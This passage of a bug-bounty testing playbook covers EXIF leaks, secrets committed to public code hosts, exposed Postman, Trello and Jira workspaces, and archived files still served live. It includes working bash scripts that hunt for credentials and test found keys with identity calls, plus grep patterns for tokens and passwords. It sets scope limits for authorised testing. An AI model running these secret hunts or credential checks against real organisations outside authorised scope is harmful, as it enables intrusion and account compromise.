- **Proof:** the response to the request with no session (`<n>-3-anon`): A's marker in the body and a hit
  marker in the headers, next to the control on a fresh key that returns the logged-out answer. For the cookie
  form: a `Set-Cookie` line in the session-less response whose value is A's session, first four characters
  shown. State the cache vendor, the lifetime (`Age` against `max-age`) and whether the route's real URL is the
  same for every user.
- **Not a finding when:** the session-less response is the logged-out variant of the page (login form, empty
  shell, 401), cached or not. The body is the same for every visitor. The hit appears only when A's cookie is
  sent: the key includes the session (`Vary: Cookie`, a per-user key) and nobody else receives the copy. Every
  authenticated response is `MISS`, `DYNAMIC` or `BYPASS`. The marker is in the response because the URL or a
  parameter reflects it. The copy lives in the browser only: "the back button shows the page after logout" and
  "no `Cache-Control` header on an authenticated page", with no shared cache storing anything, are
  `missing-headers` and `session-expiry` material and need the victim's device (`physical`).
- **Escalate:** a stored CSRF token or session cookie is account takeover of whoever filled the cache: prove it
  on A's own entry, read with no session, never by waiting for a real user's. One request with no session to
  the route's real URL, without the cache parameter, shows whether live responses are already shared; if it
  returns somebody's data, stop at that response and follow PB-14. When only paths that look static are stored,
  the same data is reached by path confusion (`/account/x.css`, `/api/me;.js`): that is cache deception and
  belongs to the cache chapter, as does anything that needs an unkeyed header. A signed file URL inside a
  cached response feeds INF-012.

### INF-014 · An image uploaded by one user is served to other users with its EXIF position and device data intact

| | |
|---|---|
| **Severity** | Low standalone when the position stored in an upload is readable by other users; Medium on a product where a user's location is sensitive and anyone can fetch the original; None for author and software fields in documents the organisation published itself |
| **Requires** | upload, account |
| **Excluded by** | internal-info |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Removal of Sensitive Information Before Storage or Transfer · CWE-212 |
| **Prior art** | #446238, #906907, #615336, #1069039 |

- **Where:** every upload that another user can later fetch: avatars and cover images, listing and product
  photos, attachments in chat, comments and support tickets, group or organisation logos (#446238), identity
  documents shown to a counterparty. For each, every URL the file is served from: the resized variants, the
  thumbnail, and the original behind "download", "view full size" or the same CDN URL without its resize
  parameters.
- **Test:** the pipeline re-encodes the variants it displays, which drops metadata, and keeps the original
  bytes reachable; or it strips JPEG and forgets other formats (#1069039: GPS data survived a HEIF to PNG
  conversion). Upload an image that carries an invented position and marker strings in EXIF, then fetch every
  served variant with the second account, or with no session when only one account exists, and read the
  metadata.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-014"; mkdir -p "$D"
  # 1. a test JPEG with invented EXIF: a position in the middle of the Atlantic, a device serial, two markers
  python3 -c "from PIL import Image; Image.new('RGB', (640, 480), (40, 90, 160)).save('$D/inf014.jpg', 'JPEG', quality=90)"
  exiftool -q -overwrite_original -GPSLatitude=30.0 -GPSLatitudeRef=N -GPSLongitude=40.0 -GPSLongitudeRef=W \
    -Make=SANE -Model=INF014 -SerialNumber=inf014-serial -Artist=inf014-artist -UserComment=inf014-marker "$D/inf014.jpg"
  exiftool -G1 -a -s "$D/inf014.jpg" | grep -iE 'gps|serial|artist|usercomment' | tee "$D/01-control-before-upload.txt"
  # other formats take other code paths: PNG (eXIf chunk) and HEIC (what phones send)
  python3 -c "from PIL import Image; Image.open('$D/inf014.jpg').save('$D/inf014.png')"
  exiftool -q -overwrite_original -TagsFromFile "$D/inf014.jpg" -all:all "$D/inf014.png"
  heif-enc -q 80 "$D/inf014.jpg" -o "$D/inf014.heic" && exiftool -q -overwrite_original -TagsFromFile "$D/inf014.jpg" -all:all "$D/inf014.heic"
  # 2. upload as A through the real feature (the request is in recon/$H/map.md); note every URL the response and the page give
  curl -sS "${HDR[@]}" $A -F "file=@$D/inf014.jpg;type=image/jpeg" "$T/api/upload" -o "$D/02-upload-response.json"; head -c 600 "$D/02-upload-response.json"
  # 3. each served URL, fetched as B (drop $B for the request with no session)
  for u in '<display URL>' '<thumbnail URL>' '<original or download URL>' '<display URL without its resize parameters>'; do
    f="$D/03-served-$(printf %s "$u" | md5sum | cut -c1-8)"
    curl -sS "${HDR[@]}" $B -o "$f" -w "%{http_code} %{size_download} %{content_type} $u\n" "$u"; sleep 1
    exiftool -G1 -a -s "$f" | grep -iE 'gps|serial|artist|usercomment' || echo "   stripped"
  done | tee "$D/03-served.txt"
  ```
- **Proof:** the `exiftool` output of the file as fetched by B or without a session, showing the position and
  the marker that went in, next to the control output from before the upload; the URL it came from and where
  the interface links it; who can reach that URL (any visitor, any logged-in user, members of one
  conversation).
- **Not a finding when:** only the uploader can fetch the original. Every variant another user can reach is
  stripped. The product stores files as they are on purpose (file sharing, cloud storage, a photography service
  that displays EXIF). What survives is the colour profile, the dimensions or the editing software, with no
  position and no device serial. The file is a document the organisation published itself and the metadata is
  an author name, a user name, a printer or a software version (#36586 was not paid). Where location is not
  sensitive, programmes close this as informative or list it as a known issue; the paid reports are small
  (#446238 $500, #906907 $200, #615336 $50).
- **Escalate:** on a product that hides who and where its users are (dating, marketplace, anonymous reporting)
  say so in the report: a home position in a listing photo is the impact, and the rating moves to medium. Where
  the original is reachable only by swapping an id, pair it with BAC-004 (#906907 was filed as an IDOR). The
  stripping step is an attack surface of its own: metadata tools and image converters parse hostile files
  (#1154542 was code execution in the tool that removes the metadata). That is work for the upload and CVE
  chapters; XMP inside an image is XML and goes to XXE-008.

### INF-015 · A credential committed to a public repository of the organisation or of one of its engineers is still valid

| | |
|---|---|
| **Severity** | High standalone when one identity call proves the credential live on a system of the organisation; Critical for a source-host, cloud or artifact-registry credential with write access or production reach; None for a dead, example or personal credential |
| **Requires** | code-host-token |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | high |
| **Weakness** | Use of Hard-coded Credentials · CWE-798 |
| **Prior art** | #591813, #911606, #496937, #124100 |

- **Where:** no fact about any asset is needed: the work happens on the code hosts, once per engagement, and
  nothing is sent to the target. GitHub: the organisation's accounts (linked from the site footer, the
  developer documentation and the `repository` field of published packages), their forks and gists, and the
  personal repositories of engineers, found through the public member list and through commits made with an
  address on the corporate domain (#911606 was an employee's repository). History counts: a secret deleted by
  a later commit is still in the repository. Public CI logs of those repositories (#496937 and #215625: a
  token in build logs). GitLab.com groups and Bitbucket workspaces under the organisation's name.
- **Test:** two passes. Search: strings that tie a file to the organisation (its domains, internal host names,
  private package scopes) next to key names and credential formats, across all public code. Scan: the full
  history of every repository of the organisation with a secret scanner, verification switched off so that the
  scanner sends no credential anywhere. Sort the hits by hand, then validate one credential with one read-only
  identity call and stop.
- **How:**
  ```bash
  D="$E/evidence/@programme/INF-015"; mkdir -p "$D"; ORG='<GitHub organisation login>'; DOM='<organisation domain, e.g. example.com>'
  gh auth status                                   # code search needs a token: our own, read-only, member of nothing
  # 1. the organisation's public repositories and public members
  gh api --paginate "orgs/$ORG/repos?type=public&per_page=100" --jq '.[] | [.full_name, .fork, .pushed_at, .size] | @tsv' > "$D/repos.tsv"
  gh api --paginate "orgs/$ORG/public_members?per_page=100" --jq '.[].login' > "$D/members.txt"
  # 2. code search over all public code. The endpoint allows 10 requests a minute: one query every 7 seconds.
  for t in '"DOM" password' '"DOM" secret_key' '"DOM" api_key' '"DOM" "BEGIN RSA PRIVATE KEY"' '"DOM" jdbc' '"DOM" filename:.env' \
           '"DOM" filename:.npmrc _authToken' '"DOM" filename:credentials aws_secret_access_key' '"internal.DOM"' '"corp.DOM"' \
           'org:ORG filename:.env DB_PASSWORD' 'org:ORG "Authorization: Bearer"' 'org:ORG AKIA'; do
    q=${t//DOM/$DOM}; q=${q//ORG/$ORG}
    gh api -X GET search/code -f q="$q" -f per_page=50 --jq '.items[] | [.repository.full_name, .path, .html_url] | @tsv'; sleep 7
  done > "$D/code-hits.tsv"
  cut -f1 "$D/code-hits.tsv" | sort | uniq -c | sort -rn | head -30          # which repositories keep appearing
  # commits that say they removed a secret: the secret is in the parent commit
  for q in "org:$ORG remove password" "org:$ORG remove secret" "org:$ORG remove credentials" "org:$ORG remove api key"; do
    gh api -X GET search/commits -f q="$q" -f per_page=30 --jq '.items[] | [.repository.full_name, .sha[0:10], (.commit.message | split("\n")[0])] | @tsv'; sleep 3
  done | sort -u > "$D/commit-hits.tsv"
  ```
  ```bash
  # 3. full history of the organisation's repositories. --no-verification: no finding is sent to any provider.
  trufflehog github --org="$ORG" --token="$(gh auth token)" --no-verification --json > "$D/trufflehog.jsonl" 2> "$D/trufflehog.err"
  jq -r '.SourceMetadata.Data.Github as $g | [.DetectorName, $g.repository, $g.file, $g.commit[0:10], $g.timestamp[0:10], (.Raw[0:4] + "..." + .Raw[-4:])] | @tsv' \
    "$D/trufflehog.jsonl" | sort -u | tee "$D/secrets.tsv" | head -60
  #    engineers' own repositories are a second, larger pass: one repository from members.txt or code-hits.tsv at a time
  trufflehog github --repo="https://github.com/<member>/<repository>" --token="$(gh auth token)" --no-verification --json >> "$D/trufflehog-members.jsonl"
  #    GitLab.com: the group, its public projects, the same scan per project
  curl -sS "https://gitlab.com/api/v4/groups?search=$ORG&per_page=50" | jq -r '.[] | [.id, .full_path, .visibility] | @tsv'
  curl -sS "https://gitlab.com/api/v4/groups/<group id>/projects?visibility=public&include_subgroups=true&per_page=100" | jq -r '.[].http_url_to_repo' > "$D/gitlab-repos.txt"
  while read -r r; do trufflehog git "$r" --no-verification --json >> "$D/trufflehog-gitlab.jsonl"; done < "$D/gitlab-repos.txt"
  jq -r '.SourceMetadata.Data.Git as $g | [.DetectorName, $g.repository, $g.file, $g.commit[0:10], (.Raw[0:4] + "..." + .Raw[-4:])] | @tsv' \
    "$D/trufflehog-gitlab.jsonl" | sort -u | head -40
  #    GitLab code search inside the group (GITLAB_TOKEN: our own read-only token). It needs advanced search on the
  #    group: an error object instead of a list (400, 403) means it is off, and the scan above is the way.
  curl -sS -H "PRIVATE-TOKEN: $GITLAB_TOKEN" "https://gitlab.com/api/v4/groups/<group id>/search?scope=blobs&search=password&per_page=50" | jq -r 'arrays | .[] | [.project_id, .path, .ref] | @tsv'
  # 4. is the hit still in the default branch, and since when has it been public?
  gh api "repos/<owner>/<repo>/contents/<path>" --jq '.html_url' || echo "removed at HEAD: present in history only"
  gh api "repos/<owner>/<repo>/commits?path=<path>&per_page=100" --jq '.[] | [.sha[0:10], .commit.author.date, .commit.author.email] | @tsv' | tail -3
  # 5. one read-only identity call for one credential, then stop
  AWS_ACCESS_KEY_ID='<AKIA...>' AWS_SECRET_ACCESS_KEY='<secret>' aws sts get-caller-identity
  K='<token>'
  curl -sS -D- -H "Authorization: Bearer $K" https://api.github.com/user | grep -iE '^x-oauth-scopes|"login"|"message"'
  curl -sS -H "PRIVATE-TOKEN: $K" https://gitlab.com/api/v4/user | head -c 300
  curl -sS -H "Authorization: Bearer $K" https://slack.com/api/auth.test
  curl -sS -H "Authorization: Bearer $K" https://registry.npmjs.org/-/whoami
  ```
  Credentials with no identity call (a database, SMTP, SSH, a VPN, an internal host) are reported unvalidated
  with the file and the commit. Do not connect with them.
- **Proof:** the permalink of the file at a fixed commit
  (`https://github.com/<owner>/<repo>/blob/<full sha>/<path>#L<n>`) and a saved copy of that page, because the
  author may delete the repository once the programme reacts; the line with the secret cut to its first and
  last four characters; what ties the repository to the organisation (it belongs to the organisation's account,
  or the committer address is on the corporate domain and the credential's host is the organisation's); the
  commit date; and the identity call's output naming the principal and its scopes, with the time of the call.
- **Not a finding when:** the identity call fails: a key rotated long ago is history, and "a secret was once
  committed" is closed as informative. The value is an example or a fixture (`AKIAIOSFODNN7EXAMPLE`, a key in a
  test directory for a mock server, `changeme` for a local database in `docker-compose.yml`). The credential is
  personal: an engineer's token for a side project opens nothing of the organisation's. The repository belongs
  to a customer or an integrator and the key is theirs, for the organisation's public API: it is their leak
  (`third-party`). The key is public by design (Google Maps browser key, Firebase web config, Stripe
  `pk_live_`, Sentry DSN). The hit is source code, an internal host name or an e-mail address with no
  credential. The credential came from a breach dump, a paste site or stealer logs: that is
  `leaked-credentials` and is never tried. Read the policy for a sentence on secrets found on code hosts before
  starting: some programmes accept them only for assets in scope.
- **Escalate:** report at once: a live credential is time-sensitive and duplicates are decided by hours. State
  what the scopes or the role name allow according to the provider's documentation and stop (#1087489: a token
  with read and write access to the organisation's repositories). A CI or registry credential is a
  supply-chain position: describe it, do not use it; the cloud chapter has the rules. A signing secret goes to
  JWT-004, DSR-009 or DSR-011. Internal host names, route files and private package names found on the way
  feed recon, SSR-010, the host-header chapter and the dependency-confusion item of the client-side chapter.

### INF-016 · A public Postman workspace, API definition, Trello board or Jira site of the organisation exposes a live credential or internal records

| | |
|---|---|
| **Severity** | Medium standalone for internal tickets, documents or request examples with customer data readable without an account; High when a credential found there is proven live with one identity call; None for a collection, board or tracker that is public on purpose |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Insecure Storage of Sensitive Information · CWE-922 |
| **Prior art** | #1523651, #1507412, #448849, #179599 |

- **Where:** no fact about any asset is needed: this runs once per engagement on third-party services where
  staff keep working material, and nothing is sent to the target. Postman's public network (workspaces,
  collections, environments, globals), SwaggerHub's public registry, Trello boards set to public, Jira and
  Confluence Cloud sites (`<name>.atlassian.net`) that allow anonymous access. Names to try: the organisation
  name, product names, and the Postman, Trello or Atlassian handles that appear in the developer documentation
  and in support links.
- **Test:** someone publishes a workspace or a board to share it with a colleague or a customer, and the
  service makes it readable by everyone. A Postman environment keeps what was typed into the "initial value"
  column; a collection keeps `Authorization` headers and example responses; a Trello card keeps a pasted
  password; a Jira permission scheme that grants "anyone" serves issues and attachments to clients with no
  account. Find what is public, read only enough to classify it, and validate one credential with one
  read-only identity call.
- **How:**
  ```bash
  D="$E/evidence/@programme/INF-016"; mkdir -p "$D"; ORG='<organisation name, lower case>'; DOM='<organisation domain>'
  # 1. Postman public network. There is no documented search API: this is the request the search page sends.
  #    The scope guard refuses a POST to a host outside the scope. Run this step as a command of its own after the
  #    operator has added www.postman.com to $E/allow-infra.txt, or run the search in the browser (see below).
  for q in "$DOM" "api.$DOM" "$ORG"; do
    jq -cn --arg q "$q" '{service:"search", method:"POST", path:"/search-all", body:{queryIndices:["collaboration.workspace","runtime.collection","runtime.request"], queryText:$q, size:50, from:0, requestOrigin:"srp", mergeEntities:"true", nonNestedRequests:"true", domain:"public"}}' \
      | curl -sS -X POST 'https://www.postman.com/_api/ws/proxy' -H 'Content-Type: application/json' -d @- \
      | jq -r '.data[]?.document | [.documentType, .publisherHandle, (.workspaces[0].id // "-"), .id, .name, (.url // "-")] | @tsv'; sleep 3
  done | sort -u | tee "$D/postman-hits.tsv"
  curl -sS 'https://www.postman.com/_api/request/<request id>' -o "$D/postman-request.json"               # url, headerData, auth, body
  curl -sS 'https://www.postman.com/_api/workspace/<workspace id>/globals' -o "$D/postman-globals.json"
  grep -ohiE '"key" *: *"[^"]*(auth|token|secret|passw|api[_-]?key|cookie)[^"]*" *, *"value" *: *"[^"{]{6,}' "$D"/postman-*.json \
    | sed -E 's/("value" *: *"[^"]{4})[^"]*/\1.../' | sort -u | head -20                                   # {{placeholders}} are skipped
  # 2. SwaggerHub public registry: definitions that name the organisation, then the hosts and credentials inside one
  curl -sS "https://api.swaggerhub.com/apis?query=$DOM&limit=100&sort=UPDATED" \
    | jq -r '.apis[] | [.name, (.properties[] | select(.type == "Swagger") | .url)] | @tsv' | tee "$D/swaggerhub.tsv"
  curl -sS '<definition URL from the list>' -o "$D/definition.json"; jq -r '.servers[]?.url, .host? // empty' "$D/definition.json"
  grep -noiE '(authorization|x-api-key|bearer|basic|passw|secret|token)[" ]*[:=]? *"?[A-Za-z0-9+/_.=-]{16,}' "$D/definition.json" \
    | sed -E 's/([A-Za-z0-9+/_.=-]{4})[A-Za-z0-9+/_.=-]{8,}/\1.../' | head -20
  # 3. Trello: public boards of a workspace, then one board as JSON. Public data needs no key; a 401 or 404 means private or no such name.
  for w in "$ORG" "${ORG}team" "${ORG}hq" "${ORG}dev"; do
    curl -sS "https://api.trello.com/1/organizations/$w/boards?filter=public&fields=name,shortUrl,dateLastActivity" | head -c 800; echo " <- $w"; sleep 2; done
  curl -sS 'https://trello.com/b/<board short id>.json' -o "$D/trello-board.json"
  jq -r '.cards[] | [.shortUrl, .name, (.desc | gsub("\\s+"; " ") | .[0:160])] | @tsv' "$D/trello-board.json" \
    | grep -iE 'passw|secret|token|api[ _-]?key|credential|login|vpn|ssh|aws|\.env' | head -20
  jq -r '.actions[] | select(.type == "commentCard") | [.data.card.shortLink, (.data.text | gsub("\\s+"; " ") | .[0:160])] | @tsv' "$D/trello-board.json" \
    | grep -iE 'passw|secret|token|api[ _-]?key|credential' | head -20
  # 4. Jira and Confluence Cloud: what a client with no account receives
  for s in "$ORG" "${ORG}-team" "${ORG}dev" "${ORG}hq"; do S="https://$s.atlassian.net"
    curl -sS -o /dev/null -w "%{http_code} $S\n" "$S/rest/api/2/serverInfo"                                      # 200: the site exists
    curl -sS "$S/rest/api/3/project/search?maxResults=50" | jq -r '.values[]? | [.key, .name] | @tsv' 2>/dev/null # projects open to anyone
    curl -sS "$S/rest/api/3/search/jql?jql=created%20%3E%3D%20-3650d%20order%20by%20created%20desc&maxResults=1&fields=summary,created" \
      | jq -c '{newest: .issues[0].key}' 2>/dev/null                                                              # null: no issue is visible
    curl -sS "$S/wiki/api/v2/spaces?limit=25" | jq -r '.results[]? | [.key, .name] | @tsv' 2>/dev/null
    sleep 2; done
  # 5. one read-only identity call for one credential found, then stop
  AWS_ACCESS_KEY_ID='<AKIA...>' AWS_SECRET_ACCESS_KEY='<secret>' aws sts get-caller-identity
  curl -sS -D- -H 'Authorization: Bearer <token>' https://api.github.com/user | grep -iE '^x-oauth-scopes|"login"|"message"'
  #    a token for the organisation's own API: the host must be in scope, and the only request is its "who am I" route
  scripts/sane scope check '<API host named in the collection>' \
    && curl -sS "${HDR[@]}" -H 'Authorization: Bearer <token>' 'https://<API host>/<identity route, e.g. /v1/me>' | head -c 300
  ```
  ```text
  boards and sites that the name guesses miss, through a search engine in the scriptable browser:
  site:trello.com "<organisation>"          site:trello.com "<domain>" password
  site:atlassian.net "<organisation>"       site:postman.com "<domain>"       site:app.swaggerhub.com "<domain>"
  ```
  The Postman endpoints are the web application's own and change without notice. When they answer with an
  error, run the same search at `https://www.postman.com/search?q=<domain>&scope=public&type=all` in the
  scriptable browser; `porch-pirate -s "$DOM"` wraps the same calls. Never send the other requests of a
  collection with the token found in it: the token is somebody's account, and one identity call is the limit.
- **Proof:** for a credential: the public URL of the workspace, board or issue and the handle that ties it to
  the organisation, the field name with the value cut to its first and last four characters, and the output of
  the one identity call naming the principal. For internal records: the anonymous request, the count it
  returns, and one record reduced to its key and title with personal data redacted. Do not page through
  tickets.
- **Not a finding when:** the collection or definition is the organisation's published developer material with
  placeholders (`{{api_key}}`, `<YOUR_TOKEN>`) or sandbox keys. A Postman variable shows an empty value: the
  secret existed only in the author's local "current value". The workspace belongs to a customer, an integrator
  or a tutorial author and holds their own key for the organisation's public API (`third-party`). The token is
  expired (decode a JWT's `exp` offline) or the identity call refuses it. Jira answers with `serverInfo`, an
  empty project list or only the system dashboard: Jira gives those to anonymous clients by default. The
  public project is a public tracker on purpose (open-source bugs, a roadmap). A service-desk portal lets
  anyone sign up and shows each customer their own requests: that is the product. A Trello board is a public
  roadmap with nothing private on its cards. An internal API definition without a credential is information:
  it becomes a finding when the routes it names answer without authorisation, and that is reported under access
  control.
- **Escalate:** check every host named in a collection or a definition with `scripts/sane scope check` and
  hand the in-scope ones to recon; their route lists are the work list for BAC-011, BAC-013 and the API
  chapter. Customer data in tickets or attachments is a privacy incident: stop at the first record and follow
  PB-14. A live cloud or source-host key is rated as in INF-015. A self-hosted Jira or Confluence on one of the
  organisation's own hosts is an asset, not this item: it goes to the CVE chapter.

### INF-017 · A non-public file that web archives recorded for this host, and that the site no longer links, is still served by the live host

| | |
|---|---|
| **Severity** | Medium standalone for a non-public file (backup, export, configuration, internal document) that the live host still serves; High when it holds a live credential or other people's personal data; None for a URL that now answers 404 or for content that is public |
| **Requires** | !redirect-only |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-538 |
| **Prior art** | #1639011, #1880929, #751729, #3210022 |

- **Where:** the URL history of this host name in the Wayback Machine index and in the Common Crawl index, plus
  `recon/$H/urls-history.txt` when recon wrote it. The item runs per host: each host name has its own history,
  and a host that now shows a bare 403 or a default page at `/` often still serves deep paths that only the
  archives remember. The Wayback index folds `www.` into the bare name; every candidate is requested on `$T`
  only.
- **Test:** crawlers recorded every URL that was once linked: backups, exports, old admin and API paths,
  configuration files, documents. The site later removed the link and left the file. Filter the history for
  file types and directories that should not be public, then ask the live host for each candidate with a
  ranged request and compare with a soft-404 control.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-017"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. URL history from the archives' indexes. Nothing is sent to the target in this step.
  curl -sS "https://web.archive.org/cdx/search/cdx?url=$H/*&fl=original,statuscode,mimetype,timestamp&collapse=urlkey&limit=100000" -o "$D/wayback.txt"
  CC=$(curl -sS https://index.commoncrawl.org/collinfo.json | jq -r '.[0]["cdx-api"]')                  # the newest crawl
  curl -sS "$CC?url=$H/*&output=json&fl=url,status,mime,timestamp" | jq -r 'select(.url) | [.url, .status, .mime, .timestamp] | join(" ")' > "$D/commoncrawl.txt"
  cat "$D/wayback.txt" "$D/commoncrawl.txt" "$E/recon/$H/urls-history.txt" 2>/dev/null | awk '{print $1}' | sort -u > "$D/urls.txt"; wc -l < "$D/urls.txt"
  # 2. candidates: file types and directories that should not be public; query strings that carried secrets
  grep -iE '\.(sql|bak|old|orig|save|swp|zip|tar|t?gz|7z|rar|env|ini|conf|cfg|ya?ml|log|csv|xlsx?|pem|key|p12|pfx|jks|kdbx|sqlite3?|db|dump)(\.[a-z0-9]{1,4})?([?#]|$)|/(config|settings|credentials|secrets?|appsettings|service-?account)[^/?]*\.(json|js|xml|php|txt)([?#]|$)|/(backups?|dumps?|exports?|private|internal|tmp|temp|old|archive)/[^?]+' \
    "$D/urls.txt" | sort -u > "$D/cand-files.txt"
  grep -iE '[?&](token|access_token|id_token|api_?key|key|secret|sig|signature|password|passwd|pwd|auth|session|sid|code|reset|invite|jwt)=[^&]{6,}' \
    "$D/urls.txt" | sort -u > "$D/cand-tokens.txt"; wc -l "$D/cand-files.txt" "$D/cand-tokens.txt"
  # 3. which candidates does the live host still serve? A control first, then one ranged GET each, at $RATE
  curl -sS "${HDR[@]}" -r 0-1023 -o "$D/control.bin" -w "CONTROL %{http_code} %{size_download} %{content_type}\n" "$T/sane$RANDOM.sql"
  head -300 "$D/cand-files.txt" | while read -r u; do p="/${u#*://*/}"; h=$(printf %s "$p" | md5sum | cut -c1-8)
    curl -sS "${HDR[@]}" --path-as-is -r 0-1023 -o "$D/live-$h" -w "%{http_code} %{size_download} %{content_type} live-$h $p\n" "$T$p"; sleep "$W"
  done | tee "$D/live.txt" | grep -E '^(200|206) '
  file "$D"/live-* | grep -viE 'HTML document|empty' | head -40                                   # what the first kilobyte really is
  curl -sSI "${HDR[@]}" "$T<path of a hit>" | grep -iE '^(content-length|last-modified|content-type):'
  # 4. query strings with secrets: count the parameter names and keep the shapes. Do not open these URLs.
  grep -oiE '[?&](token|access_token|id_token|api_?key|key|secret|sig|signature|password|passwd|pwd|auth|session|sid|code|reset|invite|jwt)=' "$D/cand-tokens.txt" \
    | tr -d '?&=' | sort | uniq -c | sort -rn
  sed -E 's/([?&][^=&]+=[^&]{4})[^&]*/\1.../g' "$D/cand-tokens.txt" | head -20 > "$D/token-shapes.txt"
  # 5. removed from the site but kept by the archive: the raw capture (id_ returns the original bytes), read offline
  awk '$1 ~ /\.(js|json|env|ya?ml)(\?|$)/ {print $4, $1}' "$D/wayback.txt" | sort | head -40          # timestamp and URL
  curl -sS "https://web.archive.org/web/<timestamp>id_/<original URL>" -o "$D/archived-copy.bin"; sleep 2
  ```
  `gau --subs=false "$H"` or `waybackurls` build the same list when installed. An archived reset, login,
  invitation or session URL belongs to a real user: it is evidence that the application puts secrets in URLs
  and is never replayed. What may be tested from that list is a key that belongs to the organisation itself,
  with one read-only identity call, and the lifetime of the same kind of link, with a link of our own account.
- **Proof:** the archive's record for the URL (the index line with its timestamp shows since when the address
  has been public knowledge), the live response today (status, content type, full size, first bytes with values
  redacted) and a note that the current site does not link the file. For a credential inside it: the output of
  one identity call. The archived copy alone is not the proof; the live response is.
- **Not a finding when:** the live host answers 404, 403, 410 or its soft-404 page: the file is gone and the
  copy at the archive is history. The file is public on purpose (press material, price lists, open data) or is
  still linked from the site. The 200 is the single-page app's shell (`text/html` for every path). Entries in
  `robots.txt` and sitemap URLs are not secrets (#1724771 was not paid). The only sensitive thing is in the
  copy held by an archive or a search-engine cache: personal data or tokens there earn the organisation a
  removal request and the reporter an informative or a low (#3210022 and #80118 were not paid), unless a
  credential in that copy still validates (#1639011, rated medium).
- **Escalate:** a live backup or dump follows the proof rules of INF-003, a configuration file those of
  INF-002. Old bundles and configuration files from the archive are read under INF-004, with the same single
  identity call (#1639011: keys in archived API responses were still valid). Old API versions and admin paths
  that still answer go to BAC-013 and BAC-018. Query strings with tokens show that the application puts
  secrets in URLs: INF-011 with a link of our own, and AUT-004 for how long such a link lives. Parameter names
  from the history feed the injection lanes; host names in archived links that no longer resolve feed the
  takeover chapter.

## Graveyard

- **Internal host names and private IP addresses.** `10.x` or `ip-172-31-...` in a header, an error page, a
  bundle, a DNS record or a certificate. Informative on almost every programme; no exclusion tag exists, and
  policies name it literally. By title, 32 reports name an internal address, an internal host or an origin IP:
  nine were paid, median $150, and the only one above $280 was an SSRF chain (#826097). Not carded here. Record
  the names and park them: they are the target list for SSR-010 and for the host-header chapter.
- **The origin address behind a CDN.** Knowing it is not a finding. A rule the edge enforces and the origin
  does not is, and it is reported as that bypass with the request the edge blocked.
- **`phpinfo()`, `/server-status`, an auto-index with nothing in it, stack traces, full paths, version
  banners** (`version-disclosure`). By title: `phpinfo()` 27 reports, one paid ($60); status pages 11, none
  paid; stack traces and full paths 64, seven paid, none above $140. They pay only when the page holds a secret
  that is then proven live.
- **Keys that are public by design.** Google Maps browser key, Firebase web config, Stripe publishable key,
  Sentry DSN, Algolia search-only key, reCAPTCHA site key, analytics write keys, OAuth client ids. Closed as
  informative or not applicable (#2923061). A key becomes a finding when it has rights it should not have,
  shown with one harmless call.
- **Source maps and readable front-end code** with no secret in them: three reports by title, none paid.
- **Dead, example and unvalidated credentials.** A rotated key in git history, `AKIAIOSFODNN7EXAMPLE`,
  `APP_ENV=local` values, a password for a host nobody can reach. Without the identity call there is no
  impact to rate.
- **Metadata files that hold nothing.** `/.git/HEAD` alone, `.gitignore`, a `.DS_Store` that names public
  files, `robots.txt`, `sitemap.xml`, `package.json`, `composer.lock`, `security.txt`, `crossdomain.xml`.
- **Public on purpose.** Swagger UI or an OpenAPI file for an API that is meant to be public; a published
  Postman collection with placeholders; the anonymous Jira system dashboard; an open service-desk sign-up; a
  public roadmap board.
- **Spring `health` and `info`, `/nginx_status`, `/metrics` with counters only.**
- **Missing `Cache-Control`, or the page shown again by the back button after logout** (`missing-headers`,
  `session-expiry`, `physical`), with no shared cache storing the response.
- **Missing `Referrer-Policy` with no secret in any URL** (`missing-headers`), and "the token could end up in
  proxy logs or the browser history" with no party that receives it (`mitm`, `physical`).
- **An e-mail address, a user name, or the fact that an address has an account** (`user-enum`), when that is
  all a response gives away.
- **EXIF in uploads on a product where location is not sensitive, and author names in documents the
  organisation published.**
- **Credentials from breach dumps, paste sites and stealer logs** (`leaked-credentials`): never tried. **Keys
  that belong to a customer, an integrator or a vendor's SDK** (`third-party`).
- **Exposure that exists only at an archive.** A page or a token in the Wayback Machine that the live host no
  longer serves and that validates nowhere.
- **Scanner output** (`automated`): an "exposure" template hit pasted without the file's content and without a
  validated secret.
- **Duplicates.** `/.git/`, `/.env`, actuator and `phpinfo()` on a host that has been in scope for more than a
  few weeks have been requested by every scanner. Check, and mark `dup-risk` unless the host is new or needed
  real recon to find.

## Chains

- INF-001, INF-002, INF-003, INF-006, INF-007, INF-009 (a framework or signing secret) → DSR-009 (Laravel
  `APP_KEY`), DSR-011 (Rails `secret_key_base`), DSR-010 (Django `SECRET_KEY`), DSR-005 (`machineKey`), JWT-004
  (HMAC secret): the leak turns into forged state or code execution, proven on our own session.
- SSR-003 → INF-005: an actuator closed from outside answers on `localhost` through a full-read SSRF. BAC-018
  (path spelling) → INF-005, INF-006: the deny rule in front of a debug route.
- INF-005 `mappings`, INF-007 route tables, INF-004 source maps, INF-016 API definitions → BAC-011, BAC-013 and
  the API chapter: complete route lists, including the ones the interface hides. INF-004 source → XSS-013 and
  XSS-014: sinks and message handlers readable in the original code.
- INF-006, INF-007 (a debug store or mail viewer with our second account's session or reset link) → AUT items:
  account takeover, proven on B. INF-006 `phpinfo()` echoing `HttpOnly` cookies + any XSS → XSS-018.
- INF-009 (absolute path, internal host and port in an error) → LFI items, SSR-002, SSR-010.
- INF-010 → BAC-005 and BAC-001: an id or token of B that a response gives away is the missing half of an IDOR.
  GQL-003 is the same test on a graph. Fields seen here are the candidates for mass assignment (API chapter).
- XSS-006, XSS-007 or any attacker-supplied image or link on the page that holds a token → INF-011: the
  attacker becomes the party that receives the `Referer`. With a reset token that is AUT-001; with an OAuth
  code, the OAuth chapter. INF-011 → AUT-004, AUT-017, JWT-008, JWT-009: a token that never expires makes one
  leak permanent.
- INF-012 ↔ BAC-004 (a private file fetched with another session or none), BAC-008 (an export that includes
  objects the caller cannot open), AUT-002 (tokens computed from known values).
- INF-013 ↔ CCH: cache deception and cache poisoning reach the same stored responses when the passive test is
  negative. A cached CSRF token → CSR items.
- INF-014 → BAC-004 (the original behind an id), UPL and CVE items (the image pipeline), XXE-008 (XMP).
